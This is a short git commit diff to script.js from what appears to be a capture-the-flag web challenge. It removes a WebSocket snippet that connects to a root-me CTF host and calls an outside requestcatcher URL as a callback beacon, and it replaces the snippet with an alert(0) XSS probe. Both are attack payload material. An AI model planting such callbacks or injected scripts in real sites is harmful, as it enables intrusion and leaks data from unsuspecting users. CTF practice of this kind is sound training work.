26e5ead08d65081244b5178a61bac64575556242
fullgitstack <mackormack0@gmail.com>
2025-10-02 21:24:49 +0200

    Update script.js

--- script.js
+++ script.js
@@ -1,13 +1,3 @@
 <script>
-        const socket = new WebSocket('wss://ctf10.root-me.org/ws')
-
-         socket.onopen = () => {
-
-  socket.send("hello");
-};
-
-// Quand un message arrive
-socket.onmessage = (event) => {
-  fetch("https://mhyrjyj.requestcatcher.com/test500000")
-};
-    </script>
+alert(0)
+</script>
